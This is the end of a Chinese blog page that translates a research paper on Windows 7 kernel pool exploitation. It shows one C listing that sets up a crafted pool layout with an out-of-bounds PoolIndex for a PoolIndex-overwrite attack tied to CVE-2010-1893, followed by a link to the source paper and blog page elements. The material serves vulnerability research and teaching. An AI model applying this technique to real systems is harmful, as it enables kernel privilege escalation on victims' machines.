+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"># define BASE_POOL_TYPE_MASK 1</div><div class="line"># define POOL_IN_USE_MASK 2</div><div class="line"># define BLOCK_SHIFT 3 // 4 on x64</div><div class="line">VOID</div><div class="line">InitPoolChunks ( PVOID PoolAddress , USHORT BlockSize )</div><div class="line">&#123;</div><div class="line">POOL_HEADER * pool ;</div><div class="line">SLIST_ENTRY * entry ;</div><div class="line">// chunk to be freed</div><div class="line">pool = ( POOL_HEADER *) PoolAddress ;</div><div class="line">pool - &gt; PreviousSize = 0;</div><div class="line">pool - &gt; PoolIndex = 5; // out - of - bounds pool index</div><div class="line">pool - &gt; BlockSize = BlockSize ;</div><div class="line">pool - &gt; PoolType = POOL_IN_USE_MASK | ( PagedPool &amp;</div><div class="line">BASE_POOL_TYPE_MASK ) ;</div><div class="line">// last chunk on the pending frees list</div><div class="line">entry = ( SLIST_ENTRY *) (( PCHAR ) PoolAddress + sizeof (</div><div class="line">POOL_HEADER ) ) ) ;</div><div class="line">entry - &gt; Next = NULL ;</div><div class="line">// bordering chunk ( busy to avoid coalescing )</div><div class="line">pool = ( POOL_HEADER *) (( PCHAR ) PoolAddress + ( BlockSize</div><div class="line">&lt;&lt; BLOCK_SHIFT ) ) ;</div><div class="line">pool - &gt; PreviousSize = BlockSize ;</div><div class="line">pool - &gt; PoolIndex = 0;</div><div class="line">pool - &gt; BlockSize = BlockSize ;</div><div class="line">pool - &gt; PoolType = POOL_IN_USE_MASK | ( PagedPool &amp;</div><div class="line">BASE_POOL_TYPE_MASK ) ;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<p>Listing 2. Function initializing a crafted pool layout</p>
+<p>原文链接地址：<a href="http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf" target="_blank" rel="external">http://www.mista.nu/research/MANDT-kernelpool-PAPER.pdf</a></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/path/toge/wechat-reward-image" alt="hackyzh WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/path/to/alipay-reward-ima" alt="hackyzh Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/翻译/" rel="tag">#翻译</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/07/01/Easy-File-Sharing-Web-Server-7-2-Buffer-Overflow-分析/" rel="next" title="Easy File Sharing Web Server 7.2 - Buffer Overflow 分析">
+                <i class="fa fa-chevron-left"></i> Easy File Sharing Web Server 7.2 - Buffer Overflow 分析
+              </a>
+            
+          </div>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <div class="ds-share flat" data-thread-key="2017/07/31/Windows-7-内核池利用技术/"
+     data-title="Windows 7 内核池利用技术"
+     data-content=""
+     data-url="http://yoursite.com/2017/07/31/Windows-7-内核池利用技术/">
+  <div class="ds-share-inline">
+    <ul  class="ds-share-icons-16">
+
+      <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+      <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+      <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+      <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+      <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+
+    </ul>
+    <div class="ds-share-icons-more">
+    </div>
+  </div>
+</div>
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div class="ds-thread" data-thread-key="2017/07/31/Windows-7-内核池利用技术/"
+           data-title="Windows 7 内核池利用技术" data-url="http://yoursite.com/2017/07/31/Windows-7-内核池利用技术/">
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.jpg"
+               alt="hackyzh" />
+          <p class="site-author-name" itemprop="name">hackyzh</p>
+          <p class="site-description motion-element" itemprop="description"></p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">23</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/3803148235/profile?topnav=1&wvr=6" target="_blank" title="微博">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  微博
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://douban.com/" target="_blank" title="豆瓣">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  豆瓣
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.zhihu.com/" target="_blank" title="知乎">
+                  
+                    <i class="fa fa-fw fa-globe"></i>
+                  
+                  知乎
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://thief.one" title="One Thief" target="_blank">One Thief</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.jusene.me" title="Jusenes' blog" target="_blank">Jusenes' blog</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://kongdewei.cn" title="caomei'blog" target="_blank">caomei'blog</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#1、简介"><span class="nav-number">1.</span> <span class="nav-text">1、简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2、内核池内部"><span class="nav-number">2.</span> <span class="nav-text">2、内核池内部</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1非均匀内存架构"><span class="nav-number">2.1.</span> <span class="nav-text">2.1非均匀内存架构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2、系统内存池"><span class="nav-number">2.2.</span> <span class="nav-text">2.2、系统内存池</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-池描述符"><span class="nav-number">2.3.</span> <span class="nav-text">2.3 池描述符</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-ListHeads列表（空闲列表）"><span class="nav-number">2.4.</span> <span class="nav-text">2.4 ListHeads列表（空闲列表）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-Lookaside表"><span class="nav-number">2.5.</span> <span class="nav-text">2.5 Lookaside表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-7分配算法"><span class="nav-number">3.</span> <span class="nav-text">2.7分配算法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-8释放算法"><span class="nav-number">4.</span> <span class="nav-text">2.8释放算法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-9-AMD64-x64内核池更改"><span class="nav-number">5.</span> <span class="nav-text">2.9 AMD64 / x64内核池更改</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-内核池攻击"><span class="nav-number">6.</span> <span class="nav-text">3 内核池攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-ListEntry-Flink覆盖"><span class="nav-number">7.</span> <span class="nav-text">3.1 ListEntry Flink覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-Lookaside-Next指针覆盖"><span class="nav-number">8.</span> <span class="nav-text">3.2 Lookaside Next指针覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-PendingFrees-Next指针覆盖"><span class="nav-number">9.</span> <span class="nav-text">3.3 PendingFrees Next指针覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-4-PoolIndex覆盖"><span class="nav-number">10.</span> <span class="nav-text">3.4 PoolIndex覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-5配额进程指针覆盖"><span class="nav-number">11.</span> <span class="nav-text">3.5配额进程指针覆盖</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4案例研究：CVE-2010-1893"><span class="nav-number">12.</span> <span class="nav-text">4案例研究：CVE-2010-1893</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1关于漏洞"><span class="nav-number">13.</span> <span class="nav-text">4.1关于漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2准备池内存"><span class="nav-number">14.</span> <span class="nav-text">4.2准备池内存</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3使用PoolIndex覆盖"><span class="nav-number">15.</span> <span class="nav-text">4.3使用PoolIndex覆盖</span></a></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+<div class="copyright" >
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">hackyzh</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+<span id="busuanzi_container_site_pv">
+    本站总访问量<span id="busuanzi_value_site_pv"></span>次
+</span>
+<span id="busuanzi_container_site_uv">
+  本站访客数<span id="busuanzi_value_site_uv"></span>人次
+</span>
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"whiteHat001"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = true;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = data.url;
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '' && data_content != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title < 0 && index_content < 0 ){
+                                isMatch = false;
+                            } else {
+                                if (index_content < 0) {
+                                    index_content = 0;
+                                }
+                                if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            }
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
